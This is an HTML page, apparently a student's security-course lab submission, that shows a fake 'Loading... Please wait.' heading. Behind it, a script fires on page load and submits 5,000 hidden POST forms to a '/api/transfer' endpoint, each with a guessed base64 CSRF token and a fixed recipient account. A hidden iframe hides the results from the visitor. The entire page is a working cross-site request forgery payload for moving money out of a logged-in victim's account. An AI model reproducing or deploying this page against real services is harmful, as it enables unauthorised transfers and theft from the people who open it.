<body>
<h1>Loading... Please wait.</h1>

<!-- Hidden iframe to catch form submissions -->
<iframe name="hiddenFrame"></iframe>

<script>
let last = "MzU4Ng=="; 
let base = parseInt(atob(last));

for (let i = 1; i <= 5000; i++) {
    let number = 6000;
    let new_token = btoa(number.toString());
    
    let f = document.createElement('form');
    f.method = 'POST';
    f.action = 'https://phish-me.quoccacorp.com/api/transfer';
    f.target = 'hiddenFrame'; // <-- important: target to iframe
    
    // csrf_token
    let csrf = document.createElement('input');
    csrf.type = 'hidden';
    csrf.name = 'csrf_token';
    csrf.value = new_token;
    f.appendChild(csrf);
    
    // username
    let user = document.createElement('input');
    user.type = 'hidden';
    user.name = 'username';
    user.value = 'z5508657'; // your account
    f.appendChild(user);
    
    // amount
    let amount = document.createElement('input');
    amount.type = 'hidden';
    amount.name = 'amount';
    amount.value = '20';
    f.appendChild(amount);
    
    document.body.appendChild(f);
    
    setTimeout(() => {
        f.submit();
        f.remove()
    }, i * 150); // delay between each submit
}
</script>

</body>
